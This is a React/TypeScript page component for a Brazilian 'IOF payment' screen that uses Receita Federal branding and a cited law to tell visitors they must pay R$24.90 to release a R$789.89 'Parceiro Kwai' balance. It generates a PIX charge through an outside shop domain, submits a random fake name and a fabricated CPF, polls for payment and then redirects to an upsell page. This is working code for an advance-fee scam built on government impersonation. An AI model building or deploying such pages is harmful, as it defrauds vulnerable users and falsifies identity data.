
import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

interface PixDataType {
  transaction_id?: string;
  pix_data?: {
    qrCodeText?: string;
    qrCode?: string;
  };
}

const IOF = () => {
  const navigate = useNavigate();
  const [isGeneratingPix, setIsGeneratingPix] = useState(false);
  const [showPixPopup, setShowPixPopup] = useState(false);
  const [isPixPopupAnimating, setIsPixPopupAnimating] = useState(false);
  const [isClosingPixPopup, setIsClosingPixPopup] = useState(false);
  const [pixData, setPixData] = useState<PixDataType | null>(null);
  const [copied, setCopied] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<string>("");
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Cleanup interval on unmount
  useEffect(() => {
    return () => {
      if (checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current);
      }
    };
  }, []);

  // Reset copied state after showing
  useEffect(() => {
    if (copied) {
      const timer = setTimeout(() => setCopied(false), 2000);
      return () => clearTimeout(timer);
    }
  }, [copied]);

  const generateQRCodeImage = (text: string) => {
    return `https://quickchart.io/qr?text=${encodeURIComponent(text)}&size=300`;
  };

  const getUtmParams = (): string | null => {
    if (typeof window === 'undefined') return null;

    const params = new URLSearchParams(window.location.search);
    const utmParams: Record<string, string | null> = {};

    const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];

    utmKeys.forEach(key => {
      if (params.has(key)) {
        utmParams[key] = params.get(key);
      }
    });

    if (Object.keys(utmParams).length === 0) {
      return JSON.stringify({
        utm_source: '7f52b1f8-0a0c-4e17-82c7-88e97b73f0d5::Teste_xTracky::::',
        utm_medium: 'Xtracky',
        utm_campaign: 'servico'
      });
    }

    return JSON.stringify(utmParams);
  };

  const generateRandomName = () => {
    const firstNames = ['João', 'Maria', 'Pedro', 'Ana', 'Carlos', 'Mariana', 'Lucas', 'Juliana', 'Fernando', 'Patricia'];
    const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Almeida', 'Pereira', 'Gomes', 'Martins'];
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    
    return `${firstName} ${lastName}`;
  };

  const generateRandomCPF = (): string => {
    const rand = (n: number) => Math.floor(Math.random() * n);
    const n = Array(9).fill(0).map(() => rand(9));
    
    // Cálculo do primeiro dígito verificador
    let d1 = n.reduce((acc, val, idx) => acc + (val * (10 - idx)), 0);
    d1 = 11 - (d1 % 11);
    if (d1 >= 10) d1 = 0;
    
    // Cálculo do segundo dígito verificador
    let d2 = n.reduce((acc, val, idx) => acc + (val * (11 - idx)), 0) + (d1 * 2);
    d2 = 11 - (d2 % 11);
    if (d2 >= 10) d2 = 0;
    
    return n.join('') + d1 + d2;
  };

  const checkPaymentStatus = async (transactionId: string) => {
    try {

      const response = await fetch("https://cdn.parceiro-digi.shop/PaymentController.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          action: "check_payment",
          payment_id: transactionId
        })
      });
      
      const data = await response.json();
      
      if (data.status === "APPROVED") {
        setPaymentStatus("approved");
        if (checkIntervalRef.current) {
          clearInterval(checkIntervalRef.current);
          checkIntervalRef.current = null;
        }
        // Redireciona para a página upsell1 após 2 segundos
        setTimeout(() => {
          navigate('/upsell1');
        }, 2000);
      }
    } catch (error) {
      console.error("Erro ao verificar status do pagamento:", error);
    }
  };

  const startPaymentStatusCheck = (transactionId: string) => {
    if (checkIntervalRef.current) {
      clearInterval(checkIntervalRef.current);
    }
    
    checkPaymentStatus(transactionId);
    checkIntervalRef.current = setInterval(() => checkPaymentStatus(transactionId), 10000);
  };

  const handlePayIOF = async () => {
    setIsGeneratingPix(true);
    
    try {

      const utmParamsString = localStorage.getItem("utm_params");
      const utmParams = utmParamsString ? JSON.parse(utmParamsString) : {};

      const response = await fetch("https://cdn.parceiro-digi.shop/PaymentController.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          action: "generate_pix",
          name: generateRandomName(),
          email: "cliente@email.com",
          cpf: generateRandomCPF(),
          telefone: "19298373473",
          amount: 2490,
          item_title: "Parceiro Kwai",
           utmQuery: JSON.stringify(utmParams),
          referrerUrl: "https://www.exemplo.com/pagina"
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPixData({
          ...data,
          pix_data: {
            ...data.pix_data,
            qrCode: generateQRCodeImage(data.pix_data.qrCodeText)
          }
        });
        startPaymentStatusCheck(data.transaction_id);
        setShowPixPopup(true);
        setIsPixPopupAnimating(true);
      }
    } catch (error) {
      console.error("Erro ao gerar PIX:", error);
    } finally {
      setIsGeneratingPix(false);
    }
  };

  const handleCopyPix = (): void => {
    if (pixData?.pix_data?.qrCodeText) {
      try {
        navigator.clipboard.writeText(pixData.pix_data.qrCodeText)
          .then(() => {
            setCopied(true);
            setShowModal(true);
          })
          .catch((err) => {
            console.error('Falha ao copiar texto: ', err);
          });
      } catch (err) {
        console.error('Erro ao acessar clipboard: ', err);
      }
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header Receita Federal */}
      <div className="bg-[#1E3A8A] text-white px-4 py-4">
        <div className="flex items-center justify-center">
          <img 
            src="/img/receitafederal.png" 
            alt="Receita Federal" 
            className="h-8"
          />
        </div>
      </div>

      <div className="px-4 py-6 max-w-md mx-auto">
        {/* Alert IOF */}
        <div className="bg-yellow-100 border border-yellow-400 rounded-lg p-3 mb-6 flex items-start space-x-2">
          <div className="text-yellow-700 mt-0.5">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
              <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
            </svg>
          </div>
          <span className="text-yellow-800 text-sm font-medium">
            Imposto sobre Operações Financeiras (IOF)
          </span>
        </div>

        {/* Título */}
        <h1 className="text-xl font-bold text-gray-900 mb-4 leading-tight">
          Pagamento do IOF Obrigatório para Liberação do Saldo Acumulado
        </h1>

        {/* Texto explicativo */}
        <p className="text-gray-700 text-sm mb-4">
          Para liberar o valor acumulado de <strong>R$789,89</strong>, é necessário o pagamento do (IOF) no valor de <strong>R$24,90</strong>.
        </p>

        <div className="bg-red-50 border-l-4 border-red-400 p-3 mb-6">
          <p className="text-red-800 text-sm">
            <strong>*</strong> Conforme exigido pelo Banco Central do Brasil (Lei nº 8.894/94), o pagamento do (IOF) é obrigatório para a liberação do saldo acumulado. O valor será reembolsado automaticamente junto com o saldo.
          </p>
        </div>

        {/* Resumo */}
        <div className="bg-gray-100 rounded-lg p-4 mb-6">
          <h2 className="font-bold text-gray-900 mb-3">Resumo</h2>
          
          <div className="space-y-2">
            <div className="flex justify-between">
              <span className="text-gray-700">Valor ganho</span>
              <span className="font-semibold">R$789,89</span>
            </div>
            
            <div className="flex justify-between">
              <span className="text-gray-700">Valor a ser pago (IOF)</span>
              <span className="font-semibold text-red-600">- R$24,90</span>
            </div>
            
            <div className="text-xs text-gray-500">
              *(Reembolsado após Aprovação da Conta e Liberação do Saque)
            </div>
            
            <hr className="my-2"/>
            
            <div className="flex justify-between font-bold text-lg">
              <span>Total a receber no PIX</span>
              <span>R$789,89</span>
            </div>
          </div>

          <div className="mt-3 flex items-start space-x-2">
            <div className="bg-blue-600 rounded-full p-1 mt-0.5">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
              </svg>
            </div>
            <p className="text-xs text-gray-600">
              O pagamento de R$789,89 será processado via PIX imediatamente após a confirmação.
            </p>
          </div>
        </div>

        {/* Botão Pagar */}
        <button 
          onClick={handlePayIOF}
          disabled={isGeneratingPix}
          className="w-full bg-[#1E3A8A] text-white font-bold py-4 rounded-lg text-lg mb-6 hover:bg-[#1E40AF] transition-colors"
        >
          {isGeneratingPix ? (
            <div className="flex items-center justify-center space-x-2">
              <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              <span>GERANDO PIX...</span>
            </div>
          ) : (
            "Pagar Imposto"
          )}
        </button>

        {/* Garantia */}
        <div className="bg-white border border-gray-200 rounded-lg p-4 mb-6">
          <div className="flex items-center space-x-2 mb-2">
            <div className="bg-green-500 rounded-full p-1">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="white">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
              </svg>
            </div>
            <h3 className="font-bold text-gray-900">Garantia de recebimento</h3>
          </div>
          <p className="text-sm text-gray-600">
            O valor total de R$789,89 será creditado diretamente no seu PIX após o pagamento.
          </p>
        </div>

        {/* Método de pagamento */}
        <div className="bg-white border border-gray-200 rounded-lg p-4 mb-6">
          <div className="flex items-center space-x-2 mb-2">
            <svg width="20" height="20" viewBox="0 0 48 48" fill="none">
              <rect x="4" y="12" width="40" height="24" rx="4" fill="#00B0AA"/>
              <path d="M16.5 24H31.5" stroke="white" strokeWidth="2"/>
              <path d="M24 16.5V31.5" stroke="white" strokeWidth="2"/>
            </svg>
            <h3 className="font-bold text-gray-900">Método de pagamento</h3>
          </div>
          <div className="flex items-start space-x-2">
            <div className="bg-blue-600 rounded-full p-1 mt-0.5">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
              </svg>
            </div>
            <p className="text-sm text-gray-600">
              <strong>Pague com PIX!</strong> Os pagamentos são simples, práticos e realizados em segundos.
            </p>
          </div>
        </div>

        {/* Dúvidas Frequentes */}
        <div className="mb-6">
          <h2 className="font-bold text-xl text-gray-900 mb-4">Dúvidas Frequentes</h2>
          
          <div className="space-y-3">
            <div className="border-b border-gray-200 pb-3">
              <p className="font-medium text-gray-900 text-sm">
                Por que o IOF de R$24,90 não é descontado do saldo acumulado de R$789,89?
              </p>
            </div>
            
            <div className="border-b border-gray-200 pb-3">
              <p className="font-medium text-gray-900 text-sm">
                Como realizar o pagamento do (IOF)?
              </p>
            </div>
            
            <div className="border-b border-gray-200 pb-3">
              <p className="font-medium text-gray-900 text-sm">
                <strong>NÃO</strong> consigo clicar no botão de "Pagar Imposto"
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Pop-up PIX na parte inferior */}
      {showPixPopup && (
        <div className="fixed inset-0 flex items-end justify-center z-50">
          <div className={`bg-white w-full max-w-md rounded-t-2xl p-6 shadow-2xl transform transition-all duration-1500 ease-out ${
            isClosingPixPopup 
              ? 'translate-y-full opacity-0' 
              : isPixPopupAnimating 
                ? 'translate-y-0 opacity-100' 
                : 'translate-y-full opacity-0'
          }`}>
            {/* Header do popup */}
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-bold text-gray-900">Pagamento via PIX</h3>
              <button 
                onClick={() => {
                  setIsClosingPixPopup(true);
                  setTimeout(() => {
                    setShowPixPopup(false);
                    setIsClosingPixPopup(false);
                    setIsPixPopupAnimating(false);
                  }, 500);
                }}
                className="text-gray-400 hover:text-gray-600 transition-colors duration-200"
              >
                <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Valor */}
            <div className="text-center mb-4">
              <p className="text-gray-600 text-sm">Valor a pagar</p>
              <p className="text-2xl font-bold text-gray-900">R$ 24,90</p>
            </div>

            {/* QR Code dinâmico */}
            <div className="flex justify-center mb-4">
              {pixData?.pix_data?.qrCode ? (
                <div className="w-40 h-40 bg-white border-2 border-gray-300 rounded-lg flex items-center justify-center">
                  <img 
                    src={pixData.pix_data.qrCode} 
                    alt="QR Code PIX" 
                    className="w-full h-full p-2"
                    onError={(e: React.SyntheticEvent<HTMLImageElement>) => {
                      const target = e.currentTarget as HTMLImageElement;
                      target.onerror = null;
                      target.src = "https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=00020126870014br.gov.bcb.pix&choe=UTF-8";
                    }}
                  />
                </div>
              ) : (
                <div className="w-40 h-40 bg-gray-200 border-2 border-gray-300 rounded-lg flex items-center justify-center">
                  <div className="text-center">
                    <svg className="animate-spin h-8 w-8 text-blue-500 mx-auto" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <p className="text-gray-500 text-sm mt-2">Gerando QR Code...</p>
                  </div>
                </div>
              )}
            </div>

            {/* Chave PIX */}
            <div className="mb-4">
              <p className="text-sm text-gray-600 mb-2">Chave PIX:</p>
              <div className="flex items-center bg-gray-100 rounded-lg p-3">
                <code className="flex-1 text-sm font-mono text-gray-800 break-all">
                  {pixData?.pix_data?.qrCodeText || "Gerando chave PIX..."}
                </code>
                <button 
                  onClick={handleCopyPix}
                  className="ml-2 bg-[#1E3A8A] text-white px-3 py-2 rounded text-sm font-medium hover:bg-[#1E40AF] transition-colors"
                  disabled={!pixData?.pix_data?.qrCodeText}
                >
                  {copied ? "Copiado!" : "Copiar"}
                </button>
              </div>
            </div>

            {/* Instruções */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
              <p className="text-blue-800 text-sm">
                <strong>Instruções:</strong> Escaneie o QR Code ou copie a chave PIX para realizar o pagamento de R$ 24,90. 
                Após a confirmação, seu saldo será liberado automaticamente.
              </p>
            </div>

            {/* Status do pagamento */}
            {paymentStatus === "approved" && (
              <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
                <p className="text-green-800 text-sm font-medium">
                  Pagamento aprovado! Seu saldo será liberado em instantes.
                </p>
              </div>
            )}

            {/* Botão de confirmação */}
            <button 
              onClick={() => {
                setIsClosingPixPopup(true);
                setTimeout(() => {
                  setShowPixPopup(false);
                  setIsClosingPixPopup(false);
                  setIsPixPopupAnimating(false);
                }, 500);
              }}
              className={`w-full ${
                paymentStatus === "approved" ? "bg-green-500 hover:bg-green-600 text-white" : "bg-gray-200 text-gray-700"
              } font-medium py-3 rounded-lg transition-all duration-200`}
            >
              {paymentStatus === "approved" ? "Continuar" : "Já realizei o pagamento"}
            </button>
          </div>
        </div>
      )}

      {/* Modal de confirmação de cópia */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg p-6 max-w-sm w-full">
            <div className="flex flex-col items-center text-center">
              <div className="bg-green-100 rounded-full p-3 mb-4">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                  <polyline points="22 4 12 14.01 9 11.01"></polyline>
                </svg>
              </div>
              <h3 className="text-lg font-bold text-gray-900 mb-2">Código copiado!</h3>
              <p className="text-gray-600 mb-4">O código PIX foi copiado para sua área de transferência.</p>
              <button 
                onClick={() => setShowModal(false)}
                className="w-full bg-[#1E3A8A] text-white font-medium py-2 px-4 rounded-lg hover:bg-[#1E40AF] transition-colors"
              >
                Fechar
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default IOF;
